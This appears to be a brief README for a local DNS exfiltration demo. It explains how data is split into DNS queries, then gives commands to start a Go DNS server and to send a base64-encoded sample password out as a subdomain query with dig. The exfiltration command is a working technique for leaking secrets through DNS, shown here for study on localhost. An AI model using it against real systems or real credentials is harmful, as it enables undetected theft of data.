DNS exfiltration means breaking data into small chunks, disguise them as DNS queries, and send them to malicious DNS servers. These servers then reconstruct the original data, enabling undetected data leakage.

![image](https://github.com/user-attachments/assets/69a9d370-be18-4ddb-8d5f-84c1a8b765b3)

```
# start the DNS server handling ZG5ZC2VJDXJPDHKK.COM on localhost:53000
go run main.go

# do a DNS query that exfiltrates encoded Pa$$w0rd and observe the server logs
dig $(echo 'Pa$$w0rd' | base64).ZG5ZC2VJDXJPDHKK.COM @localhost -p 53000 +short
```

![image](https://github.com/user-attachments/assets/5b83a9a4-34de-4a86-ade8-cb57e423ef2e)
